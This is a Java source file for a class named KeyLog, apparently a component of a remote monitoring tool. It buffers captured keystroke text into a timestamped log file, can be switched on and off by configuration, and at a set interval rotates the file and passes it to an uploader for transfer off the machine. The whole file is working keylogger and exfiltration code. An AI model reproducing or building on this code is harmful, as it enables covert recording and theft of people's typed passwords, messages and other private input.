package com.rmac.core;

import com.rmac.Main;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.NoopOutputStream;
import com.rmac.utils.Pair;
import com.rmac.utils.Utils;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

/**
 * Interface to write-to key-log output files and upload them at interval defined by
 * KeyLogUploadInterval configuration.
 */
@Getter
@Setter
@Slf4j
public class KeyLog implements Runnable {

  private File keyLogFile;
  public PrintWriter writer;
  public Thread thread;
  /**
   * Whether Key-logging process is busy with tasks that cannot involve write operations on key-log
   * file.
   */
  boolean isBusy = false;
  /**
   * Buffer to hold key-logs when Key-logging process is busy and cannot directly write to key-log
   * file at the moment.
   */
  List<Pair<KeyLogCommand, String>> buffer;
  static boolean isNewLine = true;

  /**
   * Create key-log file and initialize its writer.
   */
  public KeyLog() {
    this.keyLogFile = new File(Constants.KEYLOG_LOCATION);
    this.buffer = new ArrayList<>();

    if (Main.config.getKeyLogging()) {
      openFileWriter();
    } else {
      writer = new PrintWriter(new NoopOutputStream());
    }

    Main.config.onChange((prop, value) -> {
      if ("KeyLog".equals(prop)) {
        boolean val = Boolean.parseBoolean(value);
        if (val) {
          this.resume();
        } else {
          this.pause();
        }
      }
    });

    thread = new Thread(this, "KLOutput");
    thread.start();
  }

  /**
   * Write to key-log output file, write to buffer if busy
   *
   * @param value Text to write.
   */
  public void println(String value) {
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "] " + value;
    }
    if (!this.isBusy) {
      this.writer.println(value);
      this.writer.flush();
    } else {
      this.buffer.add(
          new Pair<>(KeyLogCommand.PRINTLN_WITH_VALUE, value));
    }
    isNewLine = true;
  }

  /**
   * Write to key-log output file a newline, write to buffer if busy
   */
  public void println() {
    String value = "";
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "]\n";
    }
    if (!this.isBusy) {
      this.writer.println(value);
      this.writer.flush();
    } else {
      this.buffer.add(new Pair<>(KeyLogCommand.PRINTLN_WITH_VALUE, value));
    }
    isNewLine = true;
  }

  /**
   * Write to key-log output file, write to buffer if busy
   *
   * @param value Text to write.
   */
  public void print(String value) {
    if (isNewLine) {
      value = "[" + Instant.now().toString() + "] " + value;
    }
    if (!this.isBusy) {
      this.writer.print(value);
      this.writer.flush();
    } else {
      this.buffer.add(new Pair<>(KeyLogCommand.PRINT, value));
    }
    isNewLine = false;
  }

  /**
   * Open a writer to key-log file.
   */
  public void openFileWriter() {
    try {
      writer = new PrintWriter(new FileWriter(keyLogFile, true));
    } catch (IOException e) {
      log.error("Could not open key-log file", e);
    }
  }

  /**
   * Close current writer, open another towards no-operation sink (for e.g. when key-log is disabled
   * via
   * <code>KeyLog</code> configuration property).
   */
  public void openNoopWriter() {
    writer.flush();
    writer.close();
    writer = new PrintWriter(new NoopOutputStream());
  }

  @Override
  public void run() {
    try {
      while (!Thread.interrupted()) {
        // Wait until it is time to upload the current key-log output file
        Thread.sleep(Main.config.getKeyLogUploadInterval());

        // If key-logging is disabled via config, no need to upload
        if (!Main.config.getKeyLogging()) {
          continue;
        }

        // Set to busy state, to re-direct all key-logs to buffer, until current key-log file upload is concluded.
        this.isBusy = true;

        // Upload current key-log output file
        writer.flush();
        try {
          String filePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
          writer.close();
          Files.move(keyLogFile.toPath(),
              Paths.get(filePath),
              StandardCopyOption.REPLACE_EXISTING);
          writer = new PrintWriter(new FileWriter(keyLogFile, true));
          Main.uploader.uploadFile(new File(filePath), ArchiveFileType.KEY);
        } catch (IOException e) {
          log.error("Could not move log file to be uploaded", e);
        } finally {
          // Once concluded, open the writer again
          try {
            writer.flush();
          } catch (Exception e) {
            openFileWriter();
          }
        }

        this.isBusy = false;
        // Unload all buffered key-logs to new key-log output file
        unloadBuffer();
      }
    } catch (InterruptedException e) {
      log.warn("Keylog interrupted");
    }
  }

  /**
   * Write all buffered information to key-log output file.
   * <br>
   * <br>
   * <cite> Key-logs will be buffered and will not
   * be directly written to key-log file when Key-logging process is busy.
   * </cite>
   */
  public void unloadBuffer() {
    for (Pair<KeyLogCommand, String> buf : this.buffer) {
      if (buf.getFirst() == KeyLogCommand.PRINT) {
        this.print(buf.getSecond());
      } else if (buf.getFirst() == KeyLogCommand.PRINTLN_WITH_VALUE) {
        this.println(buf.getSecond());
      }
    }
    this.buffer.clear();
  }

  /**
   * Close writer and stop Key-logging process
   */
  public void shutdown() {
    this.thread.interrupt();
    if (writer != null) {
      writer.close();
    }
  }

  /**
   * Close current writer and open another to re-direct key-logs to no-op sink.
   */
  public void pause() {
    this.isBusy = true;

    openNoopWriter();

    this.isBusy = false;
  }

  /**
   * Close current writer and open another to re-direct key-logs to output file.
   */
  public void resume() {
    this.isBusy = true;

    writer.close();
    openFileWriter();

    this.isBusy = false;
  }
}

enum KeyLogCommand {
  PRINT,
  PRINTLN_WITH_VALUE
}